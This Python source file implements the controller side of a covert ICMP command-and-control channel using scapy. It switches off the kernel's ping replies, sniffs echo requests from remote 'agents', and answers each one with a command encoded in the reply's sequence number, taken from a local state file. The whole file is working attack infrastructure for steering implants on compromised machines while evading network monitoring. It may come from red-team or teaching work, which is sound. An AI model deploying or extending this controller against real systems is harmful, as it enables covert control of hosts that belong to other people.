import lib.icmp_common as icmp_common
from subprocess import Popen
import atexit
from scapy.all import sniff, send, ICMP, IP

agent_table = {}


class c2Controller(icmp_common.absurdIcmp):
    def __init__(self, agent_ip):
        self.agent_ip = agent_ip
        self._update_c2_state()

    def _update_c2_state(self):
        with open("c2_state") as f:
            file_state = f.readline().strip().upper()

        if file_state in self.c2_actions:
            self.c2_state = file_state
        else:
            self.c2_state = "DO_NOTHING"

    def respond(self, identifier, sequence):
        """
        TODO respond based on the current c2_state
        """
        self._update_c2_state()

        print(f"ICMP Echo Received, responding {self.c2_state}")
        reply = ICMP(
            type="echo-reply", code=0, id=identifier, seq=self.c2_actions[self.c2_state]
        )

        # if dropped we'll just update on the next check in
        send(IP(dst=self.agent_ip) / reply, verbose=False)


def reenable_kernel_icmp():
    Popen("echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all", shell=True)
    Popen("echo 0 > /proc/sys/net/ipv6/icmp/echo_ignore_all", shell=True)


def disable_kernel_icmp():
    Popen("echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all", shell=True)
    Popen("echo 1 > /proc/sys/net/ipv6/icmp/echo_ignore_all", shell=True)


def process_incoming_packets(pkt):
    agent_ip = pkt[IP].src
    sequence = pkt[IP][ICMP].seq
    identifier = pkt[IP][ICMP].id

    # handle existing connections
    if agent_ip in agent_table:
        print("existing agent check-in")
        agent_table[agent_ip].respond(identifier, sequence)
    else:
        print("new agent check-in")
        agent_table[agent_ip] = c2Controller(agent_ip)


def start():
    atexit.register(reenable_kernel_icmp)
    disable_kernel_icmp()
    print("awaiting agent check-in")
    sniff(filter="icmp[icmptype] = icmp-echo", prn=process_incoming_packets)
